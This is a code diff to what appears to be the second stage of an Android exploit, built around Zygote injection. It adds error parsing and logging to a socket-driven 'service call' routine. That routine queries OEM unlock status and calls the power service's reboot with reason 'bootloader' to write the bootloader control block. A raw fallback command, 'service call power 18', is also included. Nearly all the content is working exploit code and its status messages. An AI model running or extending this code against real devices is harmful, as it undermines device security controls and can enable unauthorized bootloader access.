@@ -23,7 +23,16 @@ def swap_endianness(bytes_: bytes) -> bytes:
     return result
 
 
-def parse_service_result(service_result: str) -> bytes:
+def parse_service_result(service_result: str) -> tuple[bytes, str]:
+    """
+    サービスコールの結果をパースし、(生データ, エラーメッセージ) を返す。
+    """
+    # エラーがあるか確認
+    if "Exception" in service_result or "SecurityException" in service_result:
+        # エラーメッセージを抽出
+        error_lines = [line for line in service_result.split("\n") if "Exception" in line or "error" in line.lower()]
+        return b"", "\n".join(error_lines) if error_lines else service_result
+
     EXPRESSION = re.compile(
         r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
     )
@@ -36,9 +45,8 @@ def parse_service_result(service_result: str) -> bytes:
         matched_any = True
         result += codecs.decode(matched[1].replace(" ", ""), "hex")
     if not matched_any:
-        # Void methods may return no data
-        return b""
-    return swap_endianness(result)
+        return b"", service_result
+    return swap_endianness(result), ""
 
 
 def parse_boolean_result(result: bytes) -> bool:
@@ -46,7 +54,7 @@ def parse_boolean_result(result: bytes) -> bool:
         return False
     status = int.from_bytes(result[:4], "little")
     if status:
-        raise Exception("Service returned error")
+        raise Exception("Service returned error status")
     return bool(int.from_bytes(result[4:8], "little"))
 
 
@@ -74,15 +82,25 @@ class Stage2Exploit:
         func = interface[function]
         parsed = func.parse_arguments(args)
         cmd = ["service", "call", service_name, str(func.code), *parsed]
-        sock.sendall(shlex.join(cmd).encode() + b"\n")
+        full_cmd = shlex.join(cmd)
+        print(f"[CMD] {full_cmd}")
+        sock.sendall(full_cmd.encode() + b"\n")
         resp = sock.recv(10000).decode()
-        raw = parse_service_result(resp)
+        print(f"[RESPONSE]\n{resp}")
+
+        raw, error = parse_service_result(resp)
+        if error:
+            print(f"[ERROR] {error}")
+            raise ZygoteInjectionException(f"service call failed: {error}")
+
         if not raw:
+            # Void method, no return data
             return None
+
         ret = func.parse_return(raw)
         status = ret[0]
         if status:
-            raise ZygoteInjectionException(f"Error {status}")
+            raise ZygoteInjectionException(f"Service returned error code {status}")
         return ret[1] if len(ret) > 1 else None
 
     def exploit_stage2(self):
@@ -90,7 +108,7 @@ class Stage2Exploit:
             sock.connect(("127.0.0.1", self.port))
             sock.sendall(b"\n")  # flush
 
-            # --- OEM unlock (original code) ---
+            # --- OEM unlock (既存コード) ---
             print("=== OEM Unlock ===")
             try:
                 carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
@@ -116,7 +134,7 @@ class Stage2Exploit:
             print("\n=== Writing BCB (bootonce-bootloader) ===")
             try:
                 # IPowerManager.reboot(confirm=False, reason="bootloader", wait=False)
-                self.call_service(
+                result = self.call_service(
                     sock,
                     "power",
                     "reboot",
@@ -124,18 +142,23 @@ class Stage2Exploit:
                     "bootloader",   # reason
                     False           # wait
                 )
-                print("SUCCESS: BCB written. Device will boot to fastboot on next restart.")
-                print("You can now reboot manually or wait for the system to restart.")
+                if result is None:
+                    print("SUCCESS: BCB write command accepted.")
+                    print("The device should reboot to bootloader (fastboot) mode on next restart.")
+                    print("Please manually reboot the device now using: reboot")
+                else:
+                    print(f"Unexpected return value: {result}")
             except Exception as e:
                 print(f"BCB write via service call failed: {e}")
                 print("Trying fallback: raw service call command...")
                 try:
                     sock.sendall(b"service call power 18 i32 0 s16 \"bootloader\" i32 0\n")
                     resp = sock.recv(10000).decode()
-                    if "Parcel(" in resp:
-                        print("Fallback succeeded! BCB written.")
+                    print(f"[FALLBACK RESPONSE]\n{resp}")
+                    if "Parcel(" in resp and "Exception" not in resp:
+                        print("Fallback command likely succeeded. BCB should be written.")
                     else:
-                        print("Fallback output:", resp)
+                        print("Fallback command may have failed.")
                 except Exception as e2:
                     print(f"Fallback failed: {e2}")
 
